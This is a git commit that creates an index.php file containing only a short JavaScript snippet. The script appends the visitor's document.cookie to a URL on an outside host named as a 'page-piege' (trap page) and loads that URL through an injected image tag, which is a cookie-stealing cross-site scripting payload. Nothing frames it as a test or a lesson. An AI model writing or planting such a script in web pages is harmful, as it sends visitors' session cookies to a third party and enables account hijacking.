4ed17cfb4b8960ed4d8a81a071bfce0aa7eec753
Alphonsetog <38553714+Alphonsetog@users.noreply.github.com>
2020-12-28 16:42:29 +0100

    Create index.php

---
+++ index.php
@@ -0,0 +1,6 @@
+<script type="text/javascript">
+  var addr = “http://www.serveur-distant.net/page-piege.php?cookie=” + document.cookie ;
+  var imgTag = document.createElement("img") ;
+  imgTag.setAttribute("src",addr) ;
+  document.body.appendChild(imgTag) ;
+</script>
